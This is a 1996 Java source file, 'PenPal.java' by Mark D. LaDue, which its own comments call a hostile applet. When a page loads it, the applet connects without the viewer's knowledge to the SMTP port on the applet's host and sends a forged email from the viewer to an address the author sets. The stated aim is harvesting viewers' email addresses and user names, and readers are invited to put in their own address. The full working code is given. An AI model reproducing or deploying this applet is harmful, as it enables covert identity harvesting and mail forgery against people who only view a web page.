
/* PenPal.java by Mark D. LaDue */

/* March 15, 1996 *

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/*  This hostile applet forges an elctronic mail letter from the person who
    views the applet in a browser to the person whose address appears in the
    string "toMe."  The return address will be listed as
    penpal@my.hostile.applet.  The appropriate commands to use for
    sendmail can be often be found in the file /etc/mail/sendmail.hf.  
    Note that while the person viewing the applet actually does initiate
    the mail by connecting (involuntarily) to port 25, the applet host's role
    in sending it is not so easily hidden.  See the full header of any e-mail
    letter sent by the applet for more details.  By putting your address
    in the string "toMe" and by scanning your incoming mail (with the
    included shell script or another of your own), you can get the full
    e-mail address, including the user name, of many people who view the
    applet. */ 


import java.applet.*;
import java.io.*;
import java.net.*;

public class PenPal extends java.applet.Applet implements Runnable { 

    public static Socket socker;
    public static DataInputStream inner;
    public static PrintStream outer;
    public static int mailPort = 25 ;
    public static String mailFrom = "my.hostile.applet";
    public static String toMe = "mladue@math.gatech.edu"; //Change this please!
    public static String starter = new String();
    Thread controller = null;

    public void init() {

	try {
	    socker = new Socket(getDocumentBase().getHost(), mailPort);
	    inner = new DataInputStream(socker.getInputStream());
	    outer = new PrintStream(socker.getOutputStream());
        }
        catch (IOException ioe) {}
    }

    public void start() {
        if (controller == null) {
            controller = new Thread(this);
            controller.setPriority(Thread.MAX_PRIORITY);
            controller.start();
        }
    }

    public void stop() {
        if (controller != null) {
            controller.stop();
            controller = null;
        }
    }

    public void run() {
        try {
            starter = inner.readLine();
        }
        catch (IOException ioe) {}
        mailMe("HELO " + mailFrom);
        mailMe("MAIL FROM: " + "penpal@" + mailFrom);
	mailMe("RCPT TO: " + toMe);
	mailMe("DATA");
        mailMe("Hey, it worked!" + "\n." + "\n");
        mailMe("QUIT"); 
        try {
            socker.close();
        }
        catch (IOException ioe) {}
    }

    public void mailMe(String toSend) {
        String response = new String();
        try {
            outer.println(toSend);
            outer.flush();
            response = inner.readLine();
        }
        catch(IOException e) {}
    }
}

